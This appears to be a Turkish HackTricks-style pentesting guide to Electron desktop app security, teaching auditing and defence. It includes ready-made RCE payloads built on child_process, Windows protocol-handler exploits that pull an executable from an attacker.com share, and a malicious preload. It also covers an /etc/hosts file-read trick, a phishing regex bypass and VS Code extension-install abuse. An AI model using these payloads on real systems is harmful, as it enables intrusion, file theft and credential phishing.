# Electron Masaüstü Uygulamaları

{{#include ../../banners/hacktricks-training.md}}

## Giriş

Electron, ayrıcalıklı bir **Node.js** ana sürecini **Chromium** renderer süreçleriyle birleştirir. Electron bir web tarayıcısı değildir: uygulama kodu, dosya sistemi ve shell erişimi gibi yetenekleri bilerek açığa çıkarabilir. Bu nedenle güvenilmeyen içerik yüklemek, sıradan bir web sitesine kıyasla daha sıkı sınır tasarımı gerektirir.<sup>[[21]](#references)</sup>

Electron uygulama kodu genellikle bir `.asar` arşivinde paketlenir. Kaynak kodu incelemeden önce arşivi çıkarın:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Uygulamanın `package.json` dosyası ana giriş noktasını belirtir. Bu dosya genellikle renderer pencereleri oluşturur ve güvenlik açısından hassas `webPreferences` ayarlarını belirler.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron'ın iki temel process türü vardır:

- Main Process (NodeJS'e tam erişimi vardır)
- Renderer Process (güvenlik nedeniyle NodeJS erişimi kısıtlı olmalıdır)

![Electron Masaüstü Uygulamaları - Giriş: Renderer Process (güvenlik nedeniyle NodeJS erişimi kısıtlı olmalıdır)](<../../images/image (182).png>)

Bir **renderer process**, bir dosya yükleyen tarayıcı penceresi olacaktır:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process**, genellikle bir `BrowserWindow` oluşturulurken her renderer process'i yapılandırır. Güvenli ayarlar, renderer'ın ele geçirilmesinin native code execution'a dönüşme olasılığını azaltır; ancak güvenilmeyen içeriği doğası gereği güvenli hâle getirmez.<sup>[[21]](#references)[[22]](#references)</sup>

En azından şu renderer tercihlerini gözden geçirin:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** varsayılan olarak `false` değerindedir. Etkinleştirilmesi, renderer JavaScript'ine Node.js API'lerine erişim sağlar ve aynı zamanda o renderer'ın sandbox'ını devre dışı bırakır.
- **`contextIsolation`** varsayılan olarak `true` değerindedir. Sayfanın JavaScript bağlamını, preload script'leri ve Electron dahili bileşenleri tarafından kullanılan bağlamdan ayırır.
- **`preload`** için varsayılan bir yol yoktur. Yapılandırılmış bir preload script'i, sayfa script'lerinden önce çalışır ve `contextBridge` aracılığıyla kapsamı dar API'ler sunabilir.
- **`sandbox`**, Electron 20'den beri varsayılan olarak `true` değerindedir. Renderer'ın işletim sistemi kaynaklarına erişimini kısıtlar; `nodeIntegration: true` ayarı bunu devre dışı bırakır.
- **`nodeIntegrationInWorker`** varsayılan olarak `false` değerindedir ve Web Workers içindeki Node.js entegrasyonunu denetler.
- **`nodeIntegrationInSubFrames`** varsayılan olarak `false` değerindedir.
  - **`nodeIntegration`** **etkinleştirilmişse**, Electron uygulamasındaki **iframe'lere yüklenen** web sayfalarında **Node.js API'lerinin** kullanılmasına izin verir.
  - **`nodeIntegration`** **devre dışı bırakılmışsa**, preload'lar iframe içinde yüklenir.

Yapılandırma örneği:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Bazı **RCE payloads** [burada](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Trafiği yakalama

start-main yapılandırmasını değiştirin ve aşağıdaki gibi bir proxy kullanın:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REA ile statik ASAR-native sınır izleme

**REA**, JavaScript bootstrap kodunu çalıştırmadan bir ASAR'ı veya ayıklanmış uygulama dizinini okuyabilir. Uygulama grafiği; paket giriş noktalarını, paketlenmiş modülleri, `BrowserWindow` ve preload ayarlarını, `contextBridge` üyelerini, IPC kayıtlarını, native add-on isteklerini ve source map kimliklerini kaydeder. Bu, renderer'a açığa çıkarılan bir yeteneği ayrıcalıklı bir main-process handler'a kadar izlemek için başlangıç noktası sağlar.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Literal bir feature string için, Evidence kaydının tamamını `application` olarak aktarın ve seed'i hedefte gözlemlenen bir değerle değiştirin:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Aynı `trace_application_feature` iş akışı, gözlemlenen bir literal API üyesini, IPC kanalını veya modülü de başlangıç noktası olarak kabul eder. Elde edilen handler yolunu, doğrulama adaylarını ve native aktarımı, döndürülen kaynak konumlarına göre kontrol edin. Bir renderer `invoke` çağrısı yalnızca aynı tam literal kanaldaki benzersiz bir `ipcMain.handle`/`handleOnce` adayıyla eşleşir; `send` için de benzersiz bir `ipcMain.on`/`once`/`addListener` adayı gerekir. Dinamik veya yinelenen handler'lar çözümlenmemiş olarak kalır. İstenen bir `.node` üyesi, doğrulanmış bir native export değildir; bu sonuca varmadan önce eşleşen Hopper/Ghidra Evidence'ın aynı artifact digest'e sahip olması gerekir. Statik erişilebilirlik de yolun çalıştırıldığını kanıtlamaz.<sup>[[24]](#references)[[25]](#references)</sup>

Renderer-main güven sınırı ve handler doğrulaması için [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) sayfasına bakın.

Provider kapsamındaki native takip incelemesi için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) sayfasına bakın.

## Electron auto-update attack surface

Release-feed bütünlüğü, rollback, imzalı kanal karışıklığı ve staging-file TOCTOU için [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) sayfasına bakın.

## Electron Local Code Injection

Yüklü bir uygulamaya yerel yazma veya instrumentation erişiminiz varsa, ASAR/main-process ve V8 snapshot yolları ile işletim sistemine özgü bağlantılar için [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) sayfasına bakın.

## RCE: XSS + nodeIntegration

**nodeIntegration** **on** olarak ayarlanmışsa, bir web sayfasının JavaScript'i yalnızca `require()` çağrısı yaparak Node.js özelliklerini kolayca kullanabilir. Örneğin, Windows'ta calc uygulamasını çalıştırma yöntemi şöyledir:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Bu ayarda belirtilen script, **renderer'daki diğer scriptlerden önce yüklenir**; bu nedenle **Node API'lerine sınırsız erişime** sahiptir:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Bu nedenle, script node-features'ı sayfalara dışa aktarabilir:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **`contextIsolation` açıksa bu işe yaramaz**

## RCE: XSS + contextIsolation

_**contextIsolation**_, **web sayfası betikleri ile Electron'un dahili JavaScript kodu arasında ayrı bağlamlar** oluşturur; böylece her bir kodun JavaScript yürütmesi diğerini etkilemez. Bu, RCE olasılığını ortadan kaldırmak için gerekli bir özelliktir.

Bağlamlar yalıtılmamışsa bir saldırgan şunları yapabilir:

1. **Renderer'da rastgele JavaScript çalıştırabilir** (XSS veya harici sitelere yönlendirme)
2. Preload'da ya da Electron'un dahili kodunda kullanılan **yerleşik metodu kendi işleviyle değiştirebilir**
3. **Değiştirilmiş işlevin kullanılmasını tetikleyebilir**
4. RCE?

Yerleşik metotların değiştirilebileceği iki yer vardır: Preload kodunda veya Electron'un dahili kodunda:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Tıklama olayını atlatma

Bir bağlantıya tıkladığınızda kısıtlamalar uygulanıyorsa, normal sol tıklama yerine **orta tıklama yaparak** bunları atlatabilirsiniz.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Bu örnekler hakkında daha fazla bilgi için [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ve [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Bir Electron masaüstü uygulamasını dağıtırken `nodeIntegration` ve `contextIsolation` ayarlarının doğru olduğundan emin olmak çok önemlidir. Bu ayarlar etkin olduğunda, ana process'ten preload script'lerini veya Electron'ın yerel kodunu hedefleyen **client-side RCE**'nin etkili bir şekilde önlendiği bilinmektedir.

Bir kullanıcı bağlantılarla etkileşime girdiğinde veya yeni pencereler açtığında, uygulamanın güvenliği ve işlevselliği açısından kritik olan belirli event listener'lar tetiklenir:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Bu listener'lar, kendi **iş mantığını** uygulamak için **desktop application** tarafından **override edilir**. Uygulama, gezinilen bir bağlantının dahili olarak mı yoksa harici bir web tarayıcısında mı açılması gerektiğini değerlendirir. Bu karar genellikle `openInternally` adlı bir fonksiyon aracılığıyla verilir. Bu fonksiyon `false` döndürürse bağlantının, `shell.openExternal` fonksiyonu kullanılarak harici olarak açılması gerektiği anlaşılır.

**Basitleştirilmiş bir pseudocode örneği:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS güvenlik en iyi uygulamaları, çeşitli protokoller üzerinden RCE'ye yol açabileceğinden, güvenilmeyen içeriğin `openExternal` fonksiyonuna verilmemesini önerir. İşletim sistemleri RCE'yi tetikleyebilecek farklı protokolleri destekler. Bu konuyla ilgili ayrıntılı örnekler ve açıklamalar için, bu güvenlik açığından yararlanabilen Windows protokol örneklerini de içeren [bu kaynağa](https://positive.security/blog/url-open-rce#windows-10-19042) başvurabilirsiniz.<sup>[[10]](#references)</sup>

macOS'ta `openExternal` fonksiyonu, `shell.openExternal('file:///System/Applications/Calculator.app')` örneğindeki gibi rastgele komutları çalıştırmak için kullanılabilir.

**Windows protokol exploit'lerine örnekler:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Bu zafiyet **[bu raporda](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** bulunabilir.<sup>[[11]](#references)</sup>

**webviewTag**, **renderer process** içinde **NodeJS** kullanımına izin veren **kullanımdan kaldırılmış bir özelliktir**. Preload context içinde aşağıdaki gibi bir script yüklenmesine izin verdiğinden devre dışı bırakılmalıdır:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Dolayısıyla, rastgele bir sayfa yüklemeyi başaran bir saldırgan, bu etiketi **rastgele bir preload script yüklemek** için kullanabilirdi.

Bu preload script daha sonra, **RCE elde etmek için `shell.openExternal` çağıran savunmasız bir IPC servisini (`skype-new-window`)** çağırmak üzere kötüye kullanıldı:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Dahili Dosyaları Okuma: XSS + contextIsolation

**`contextIsolation`'ı devre dışı bırakmak,** yerel dosyaları okumak ve dışarı sızdırmak için `<iframe>` benzeri `<webview>` etiketlerinin kullanılmasını sağlar. Verilen bir örnek, dahili dosyaların içeriğini okumak için bu güvenlik açığından nasıl yararlanılabileceğini gösterir:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Dahili Dosyaları Okuma: XSS + contextIsolation: contextIsolation'ı devre dışı bırakmak, ... için etiketlerin kullanılmasını sağlar; bu etiketler ... benzeridir...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Ayrıca, bir Electron masaüstü uygulamasındaki kritik bir yerel dosya okuma güvenlik açığını vurgulayan **dahili bir dosyayı okuma** yöntemi daha paylaşılıyor. Bu yöntem, uygulamadan yararlanmak ve verileri dışarı sızdırmak için bir script enjekte etmeyi içerir:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Eski Chromium**

Uygulamayla birlikte gelen **Chromium** sürümü eskiyse ve bilinen güvenlik açıkları varsa, bu açıklardan yararlanarak XSS'i RCE'ye dönüştürmek mümkün olabilir.<sup>[[20]](#references)</sup>\
Bir örneği bu **writeup**'ta görebilirsiniz: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Dahili URL regex bypass üzerinden XSS phishing**

XSS bulduysanız ancak **RCE tetikleyemiyor veya dahili dosyaları çalamıyorsanız**, yine de **phishing yoluyla kimlik bilgilerini çalmayı** deneyebilirsiniz.<sup>[[1]](#references)</sup>

Öncelikle, yeni bir URL açıldığında ne olduğunu belirlemek için frontend kodunu inceleyin:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** çağrısı, bir platform bağlantısının **masaüstü penceresinde** mi yoksa üçüncü taraf bir kaynağın sistem tarayıcısında mı açılacağını belirler.

Fonksiyonun URL allowlist regex'i atlatılabiliyorsa (örneğin, hostname içindeki noktalar escape edilmediği için), bir saldırgan XSS'i kötüye kullanarak saldırganın kontrolündeki altyapıda inandırıcı bir kimlik bilgisi istemi açabilir:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

[Electron güvenlik kılavuzunda](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) belirtildiği gibi, **`file://`** üzerinde çalışan sayfalar geniş dosya erişimine sahiptir. Bu nedenle **XSS, kullanıcının makinesindeki rastgele dosyaları yüklemek için kullanılabilir**. Doğru tasarlanmış bir **custom protocol**, erişimi belirli bir dosya kümesiyle kısıtlayabilir.<sup>[[21]](#references)</sup>

## Remote module

Electron Remote module, **renderer process'lerin main process API'lerine erişmesini** sağlayarak bir Electron uygulamasındaki iletişimi kolaylaştırır. Ancak bu module'ü etkinleştirmek önemli güvenlik riskleri doğurur. Uygulamanın saldırı yüzeyini genişleterek onu cross-site scripting (XSS) saldırıları gibi güvenlik açıklarına karşı daha savunmasız hâle getirir.

> [!TIP]
> **remote** module, main process'teki bazı API'leri renderer process'lere sunsa da yalnızca bileşenleri kötüye kullanarak RCE elde etmek pek kolay değildir. Ancak bileşenler hassas bilgileri açığa çıkarabilir.

> [!WARNING]
> Hâlâ remote module'ü kullanan birçok uygulama bunu renderer process'te **NodeIntegration'ın etkin olmasını gerektirecek** şekilde yapar; bu **büyük bir güvenlik riskidir**.

Electron'ın yerleşik `remote` module'ü kullanım dışı bırakıldı ve ardından kaldırıldı; bu modeli hâlâ gerektiren uygulamalar ayrı `@electron/remote` paketini kullanabilir. Güvenlik ve performans üzerindeki etkileri nedeniyle, güvenilmeyen renderer process'lere remote tarzı yetenekler sunmaktan kaçının.

`@electron/remote` kullanılırken, önce **main process'te başlatılmalıdır**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Renderer process daha sonra modülden nesneleri içe aktarabilir:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**, remote modülündeki **`app`** nesnesi tarafından sunulan bazı ilginç **işlevlere** işaret ediyor:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - Mevcut örneği **kapatıp** yenisini **başlatarak** uygulamayı **yeniden başlatır**. **Uygulama güncellemeleri** veya önemli **durum değişiklikleri** için kullanışlıdır.
- **`app.setAppLogsPath([path])`**  
   - **App logs** depolamak için bir dizin **tanımlar** veya **oluşturur**. Loglar, **`app.getPath()`** veya **`app.setPath(pathName, newPath)`** kullanılarak **alınabilir** veya **değiştirilebilir**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - Geçerli executable'ı belirtilen **protocol** için **varsayılan handler** olarak **kaydeder**. Gerekirse **özel bir path** ve **argümanlar** sağlayabilirsiniz.
- **`app.setUserTasks(tasks)`**  
   - (Windows'ta) **Jump List** içindeki **Tasks kategorisine** görevler **ekler**. Her görev, uygulamanın nasıl **başlatılacağını** veya hangi **argümanların** iletileceğini belirleyebilir.
- **`app.importCertificate(options, callback)`**  
   - Bir **PKCS#12 certificate'ı** sistemin **certificate store'una** **aktarır** (yalnızca Linux'ta). Sonucu işlemek için bir **callback** kullanılabilir.
- **`app.moveToApplicationsFolder([options])`**  
   - Uygulamayı (macOS'ta) **Applications folder'a** **taşır**. Mac kullanıcıları için **standart bir kurulum** sağlanmasına yardımcı olur.
- **`app.setJumpList(categories)`**  
   - Windows'ta **özel bir Jump List'i** **ayarlar** veya **kaldırır**. Görevlerin kullanıcıya nasıl gösterileceğini düzenlemek için **categories** belirtebilirsiniz.
- **`app.setLoginItemSettings(settings)`**  
   - **Login** sırasında hangi **executable'ların** ilgili **seçenekleriyle** birlikte başlatılacağını **yapılandırır** (yalnızca macOS ve Windows).
  
Örnek:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences modülü

Electron'da sistem tercihlerine erişmek ve **sistem olayları yayınlamak** için kullanılan **birincil API**. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** ve **setUserDefault** gibi yöntemlerin tümü bu modülün **parçasıdır**.

**Kullanım örneği:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **NSDistributedNotificationCenter** kullanarak **native macOS notifications** dinler.  
* **macOS Catalina** öncesinde, **CFNotificationCenterAddObserver**'a **nil** geçirerek **tüm** distributed notifications'ları dinleyebilirdiniz.  
* **Catalina / Big Sur** sonrasında, sandboxed uygulamalar bildirimleri **adlarına göre** kaydederek hâlâ **birçok olaya** (örneğin **ekran kilitlenmesi/açılması**, **birimlerin bağlanması**, **ağ etkinliği** vb.) **subscribe** olabilir.

### **getUserDefault / setUserDefault**

* macOS'ta **uygulama** veya **global** tercihleri depolayan **NSUserDefaults** ile **etkileşim kurar**.
    
* **getUserDefault**, **son kullanılan dosya konumları** veya **kullanıcının coğrafi konumu** gibi hassas bilgileri **alabilir**.
    
* **setUserDefault**, bu tercihleri **değiştirebilir** ve uygulamanın **yapılandırmasını** etkileyebilir.
    
* **Eski Electron sürümlerinde** (v8.3.0 öncesinde), yalnızca NSUserDefaults'un **standard suite**'ine **erişilebilirdi**.

## Shell.showItemInFolder

Bu işlev, verilen dosyayı bir dosya yöneticisinde gösterir. Etkilenen platform ve sürümlerde bu etkileşim **dosyanın otomatik olarak çalıştırılmasına neden olabiliyordu**.

Daha fazla bilgi için şuraya bakın: [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron uygulamaları, **XSS saldırılarını önlemek** için bir **Content Security Policy (CSP)** kullanmalıdır. **CSP**, tarayıcıda **güvenilmeyen kodun çalıştırılmasını önlemeye** yardımcı olan bir **güvenlik standardıdır**.

Genellikle **`main.js`** dosyasında veya **meta tag** içinde CSP bulunan **`index.html`** şablonunda **yapılandırılır**.

Daha fazla bilgi için şuraya bakın:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Bu gerçek dünya zinciri Visual Studio Code 1.63'ü (CVE-2021-43908) etkiledi ve CSP, postMessage ve scheme handler'lar hatalı yapılandırıldığında, webview içindeki tek bir markdown tabanlı XSS'in nasıl tam RCE'ye yükseltilebileceğini gösteriyor. Herkese açık PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Saldırı zincirine genel bakış
- Webview CSP üzerinden ilk XSS: Oluşturulan CSP, `style-src 'self' 'unsafe-inline'` içeriyordu ve bu da `vscode-webview://` bağlamında inline/style tabanlı injection'a izin veriyordu. Payload, hedef webview'in extensionId değerini dışarı sızdırmak için `/stealID` adresine beacon gönderdi.
- Hedef webview URL'sini oluşturma: Sızdırılan ID kullanılarak `vscode-webview://<extensionId>/.../<publicUrl>` oluşturuldu.
- postMessage trust üzerinden ikinci XSS: Dış webview, `window.postMessage`'a sıkı origin/type denetimleri olmadan güvendi ve `allowScripts: true` ile saldırganın HTML'ini yükledi.
- Scheme/path rewriting üzerinden yerel dosya yükleme: Payload, `file:///...` adresini `vscode-file://vscode-app/...` olarak yeniden yazdı ve zayıf path validation'dan yararlanarak ayrıcalıklı bir yerel kaynağı yüklemek için `exploit.md` dosyasını `RCE.html` ile değiştirdi.
- Node etkin bağlamda RCE: Yüklenen HTML, Node API'leri kullanılabilir durumdayken çalıştırıldı ve işletim sistemi komutlarının çalıştırılmasını sağladı.

Son bağlamdaki örnek RCE primitive'i
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

postMessage güven sorunları hakkında ilgili okumalar:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: sentetik webview kısayolları + bildirimsel extension komut köprüleri

Haziran 2026'da farklı bir VS Code webview kaçış sınıfı ortaya çıktı: notebook/preview webview içindeki **güvenilmeyen JavaScript, ayrıcalıklı global kısayolları taklit edebiliyordu**; çünkü webview preload, `keydown` verilerini host workbench'e iletiyor ve host da bunları gerçek kullanıcı girdisi olarak işliyordu.<sup>[[14]](#references)</sup>

Bu, proje denetimindeki içeriğin ayrıcalıklı düzenleyici özelliklerine ulaştığı IDE güven sınırı saldırılarının daha geniş kapsamlı geçmişinin bir parçasıdır.<sup>[[19]](#references)</sup>

### Sınır ihlali

Bir cross-origin/sandboxed webview, saldırganın denetimindeki klavye alanlarını (`key`, `code`, `keyCode`, modifiers, `repeat`) **`event.isTrusted` değerini denetlemeden** ayrıcalıklı bir `postMessage`/message-port köprüsüne kopyalarsa, webview içindeki JavaScript şu yollarla workbench kısayollarını çalıştırabilir:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Bu, özellikle **synthetic typing** tarayıcı tarafından engellendiğinde kullanışlıdır. Scripted key event'ler genellikle HTML `<input>` öğelerine rastgele metin **yazamaz**, ancak yine de doğrudan `keydown` kullanan shortcut'ları tetikler.

### Pratik kötüye kullanım örüntüleri

- **Shortcut odaklı UI kötüye kullanımı:** Komut yazmaya çalışmak yerine bildirim kabulü, palette gezinme, odaktaki düğmeyi etkinleştirme veya menüde hareket etme gibi global binding'leri hedefleyin.
- **Workspace metadata'sından yararlanan öngörülebilir ayrıcalıklı istemler:** Bir repository tarafından kontrol edilen `.vscode/extensions.json`, bir saldırgan uzantısını önerebilir ve `Ctrl+Shift+A` gibi bir shortcut ile kabul edilebilecek öngörülebilir bir yükleme bildirimi oluşturabilir.
- **Komut köprüsü olarak bildirimsel extension manifest'i:** Web VS Code'da local workspace extension kodu CSP tarafından engellense bile, bildirimsel `package.json` katkıları yine de yüklenebilir. `.vscode/extensions` altındaki bir local extension, `runCommands` ve ardından `workbench.extensions.installExtension` gibi ayrıcalıklı bir internal command'i çağıran bir keybinding kaydedebilir.<sup>[[14]](#references)[[18]](#references)</sup>

Örnek manifest kalıbı:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Güvenilmeyen metadata üzerinden erişilebilen gizli güvenlik bayrakları:** Dahili komut `{"context":{"skipPublisherTrust":true}}` gibi saldırganın kontrolündeki argümanları kabul ediyorsa, bildirimsel metadata bir güven penceresini bastırıp Marketplace/CDN üzerinden barındırılan ve sonunda saldırgan kodunu çalıştıran bir eklenti yükleyebilir.
- **Güvenilen çalışma alanlarının kötüye kullanılması:** Uzak/web çalışma alanları otomatik olarak güvenilir kabul ediliyorsa, yerel çalışma alanı eklentileri depo içeriğinden ayrıcalıklı editör işlemlerine uzanan değerli bir köprüye dönüşür.
- **Ele geçirilme sonrası kapsamın genişletilmesi:** Eklenti çalıştırıldıktan sonra editörün eklentilere hangi token'ları sunduğunu inceleyin. `github.dev` ortamında çalınan GitHub token'ı, açılan deponun ötesinde geçerliydi; bu nedenle `https://api.github.com/user/repos` sorgusu erişilebilir başka özel depoları da listeledi.

### Denetim notları

- **Webview'den ana makineye girdi iletimini** bir ayrıcalık sınırı olarak ele alın; güvenilmeyen çerçevelerden gelen sentetik tuş/tıklama olaylarını ana makineye yeniden göndermeyin.
- Hassas komutların **içinde** yetkilendirme uygulayın. `skipPublisherTrust` gibi dahili bayrakları ayarlayabilen, çağıran tarafından sağlanan komut bağlamını kabul etmeyin.
- Çalıştırılabilir yerel eklenti kodunu engellemenin yeterli olduğunu varsaymayın; çalışma alanı denetimindeki manifestlerdeki **bildirimsel katkıları** (`keybindings`, `menus`, `commands`, tasks) da inceleyin.
- 3 Haziran 2026 düzeltmeleri, iletilen olaylara `isTrusted` ekledi, notebook webview'larında güvenilmeyen tuş iletimini devre dışı bıraktı ve çağıran tarafından sağlanan yükleme komutu bağlamının kabul edilmesini durdurdu.<sup>[[16]](#references)[[17]](#references)</sup>

## **Araçlar**

Derlenmiş **awesome-electronjs-hacking** koleksiyonu ek araştırma, araç ve savunmasız uygulama kaynakları sunar.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity), Electron tabanlı uygulamalardaki yanlış yapılandırmaları ve güvenlik karşıtı kalıpları tespit eden bir araçtır.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint), Electronegativity kullanan, Electron uygulamalarına yönelik açık kaynaklı bir VS Code eklentisidir.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan), savunmasız üçüncü taraf kütüphaneleri denetler.
- [**Electro.ng**](https://electro.ng/), ticari bir Electron güvenlik analizi aracıdır.

